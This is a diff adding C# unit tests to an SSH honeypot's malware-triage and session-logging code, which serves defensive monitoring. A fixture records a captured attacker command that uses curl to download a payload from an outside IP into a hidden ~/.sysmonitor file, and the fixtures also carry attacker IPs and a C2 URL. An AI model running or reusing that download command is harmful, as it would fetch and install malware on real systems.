@@ -1895,3 +1895,157 @@ public class SessionCommandWorkerTests
         Assert.False(worker.TryPost(() => { }));
     }
 }
+
+public class MalwareToolReviewerTests
+{
+    [Fact]
+    public async Task ReviewAndPersistAsync_WritesPrivateDraftWithoutSendingRawCaptureContext()
+    {
+        var directory = Directory.CreateTempSubdirectory("funnypot-review-");
+        try
+        {
+            var sample = Path.Combine(directory.FullName, "sample.quarantine");
+            var metadata = sample + ".meta.json";
+            await File.WriteAllTextAsync(sample, "private-fixture-marker");
+            var record = new BinaryUploadMetadataRecord
+            {
+                StoredFilePath = sample, Source = "url_payload", CapturedBytes = 22,
+                CommandText = "private-command-marker", Truncated = true
+            };
+            await File.WriteAllTextAsync(metadata, System.Text.Json.JsonSerializer.Serialize(record));
+
+            var draft = await MalwareToolReviewer.ReviewAndPersistAsync(metadata, llm: (messages, _) =>
+            {
+                var prompt = messages.Last().Content;
+                Assert.DoesNotContain("private-", prompt);
+                Assert.Contains("Truncated: True", prompt);
+                return Task.FromResult(("{\"ExecutiveSummary\":\"Fixture triage draft.\"}", 0, 0, 0, "test-model"));
+            });
+
+            Assert.Equal("test-model", draft?.Model);
+            Assert.Contains("Fixture triage draft", await File.ReadAllTextAsync(sample + ".review.json"));
+            Assert.DoesNotContain("Draft", await File.ReadAllTextAsync(metadata));
+        }
+        finally
+        {
+            directory.Delete(recursive: true);
+        }
+    }
+
+    [Fact]
+    public async Task RunStaticToolsAsync_CollectsReadOnlyToolOutputsOnSampleFile()
+    {
+        var tempFile = Path.Combine(Path.GetTempPath(), $"funnypot-sample-{Guid.NewGuid():N}.bin");
+        try
+        {
+            var sampleBytes = new byte[] { 0x7f, (byte)'E', (byte)'L', (byte)'F', 2, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0 };
+            await File.WriteAllBytesAsync(tempFile, sampleBytes);
+
+            var outputs = await MalwareToolReviewer.RunStaticToolsAsync(tempFile);
+            Assert.NotEmpty(outputs);
+            Assert.Contains(outputs, o => o.Tool == "file" || o.Tool == "strings" || o.Tool == "hexdump" || o.Tool == "readelf");
+        }
+        finally
+        {
+            if (File.Exists(tempFile)) File.Delete(tempFile);
+        }
+    }
+
+    [Fact]
+    public void TryParseReviewJson_ParsesStructuredLlmReview()
+    {
+        var raw = """
+        ```json
+        {
+          "Verdict": "malicious",
+          "SuspectedFamily": "SysMonitorCrew",
+          "ExecutiveSummary": "Packed x86-64 ELF staged to ~/.sysmonitor after GPU enumeration.",
+          "Capabilities": ["GPU reconnaissance", "Background execution"],
+          "PackingAndObfuscation": ["UPX markers at offsets 236 and 1517603", "Entropy 7.999"],
+          "NetworkAndPersistenceIndicators": ["http://103.160.59.94:28816"],
+          "DefensiveRecommendations": ["Block delivery IP", "Check ~/.sysmonitor"]
+        }
+        ```
+        """;
+
+        Assert.True(MalwareToolReviewer.TryParseReviewJson(raw, "openai/gpt-6.1-terra", out var review));
+        Assert.NotNull(review);
+        Assert.Equal("malicious", review!.Verdict);
+        Assert.Equal("SysMonitorCrew", review.SuspectedFamily);
+        Assert.Equal("openai/gpt-6.1-terra", review.Model);
+        Assert.Contains("GPU reconnaissance", review.Capabilities);
+    }
+
+    [Fact]
+    public void MergeStructuredSession_PreservesCommandsWhenLatePayloadCaptureArrivesAfterSessionEnd()
+    {
+        var startedAt = new DateTime(2026, 11, 25, 1, 7, 37, DateTimeKind.Utc);
+        var endedAt = new DateTime(2026, 11, 25, 1, 8, 43, DateTimeKind.Utc);
+        var lateCaptureAt = new DateTime(2026, 11, 25, 1, 8, 49, DateTimeKind.Utc);
+
+        var existing = new SessionDebrief
+        {
+            SessionId = "035e6d1ae3bb40ff",
+            StartedAt = startedAt,
+            EndedAt = endedAt,
+            DurationSeconds = 65.6,
+            RemoteEndpoint = "77.239.124.73:10746",
+            RemoteIp = "77.239.124.73",
+            Username = "hafih",
+            ClientVersion = "SSH-2.0-Go",
+            AuthAccepted = true,
+            ShellOpened = true,
+            CommandCount = 1,
+            Commands = new List<CommandExchangeRecord>
+            {
+                new()
+                {
+                    Sequence = 32,
+                    ExchangeId = "035e6d1ae3bb40ff:000008",
+                    MessageNumber = 8,
+                    Command = "curl -sSL http://103.160.59.94:28816/payload -o ~/.sysmonitor",
+                    Timestamp = startedAt.AddSeconds(27),
+                    HasResponse = true,
+                    Response = "",
+                    ResponseSource = "cache"
+                }
+            },
+            Timeline = new List<SessionTimelineRecord>
+            {
+                new() { Timestamp = startedAt, Event = "session_start", Sequence = 1 },
+                new() { Timestamp = startedAt.AddSeconds(27), Event = "command", Sequence = 32, ExchangeId = "035e6d1ae3bb40ff:000008" },
+                new() { Timestamp = endedAt, Event = "session_end", Sequence = 36 }
+            },
+            PayloadUrls = new List<string> { "http://103.160.59.94:28816/payload" },
+            TacticsObserved = new List<string> { "Command and Control" },
+            RiskScore = 42
+        };
+
+        var latePayloadOnly = new SessionDebrief
+        {
+            SessionId = "035e6d1ae3bb40ff",
+            RemoteEndpoint = "77.239.124.73:10746",
+            RemoteIp = "77.239.124.73",
+            Username = "unknown",
+            ClientVersion = "unknown",
+            CommandCount = 0,
+            Timeline = new List<SessionTimelineRecord>
+            {
+                new() { Timestamp = lateCaptureAt, Event = "payload_capture", Sequence = 37, ExchangeId = "035e6d1ae3bb40ff:000008" }
+            }
+        };
+
+        var merged = Logger.MergeStructuredSession(existing, latePayloadOnly);
+
+        Assert.Equal("hafih", merged.Username);
+        Assert.Equal("SSH-2.0-Go", merged.ClientVersion);
+        Assert.Equal(startedAt, merged.StartedAt);
+        Assert.Equal(endedAt, merged.EndedAt);
+        Assert.Equal(1, merged.CommandCount);
+        Assert.Single(merged.Commands);
+        Assert.Equal("035e6d1ae3bb40ff:000008", merged.Commands[0].ExchangeId);
+        Assert.Equal(4, merged.Timeline.Count);
+        Assert.Contains(merged.Timeline, t => t.Event == "payload_capture" && t.ExchangeId == "035e6d1ae3bb40ff:000008");
+        Assert.True(merged.RiskScore >= 42);
+    }
+}
